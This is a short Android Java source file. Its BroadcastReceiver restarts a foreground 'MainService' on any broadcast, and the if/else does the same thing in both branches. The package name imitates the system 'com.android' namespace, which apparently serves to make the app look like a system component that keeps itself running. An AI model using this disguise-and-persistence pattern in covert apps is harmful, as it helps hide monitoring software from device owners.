package com.android.background.services.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import androidx.core.content.ContextCompat;

import com.android.background.services.MainService;

public class MyReceiver extends BroadcastReceiver {
    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("com.android.background.services.RESTART_SERVICE")) {
            Intent serviceIntent = new Intent(context, MainService.class);
            ContextCompat.startForegroundService(context, serviceIntent);
        } else {
            Intent serviceIntent = new Intent(context, MainService.class);
            ContextCompat.startForegroundService(context, serviceIntent);
        }
    }
}
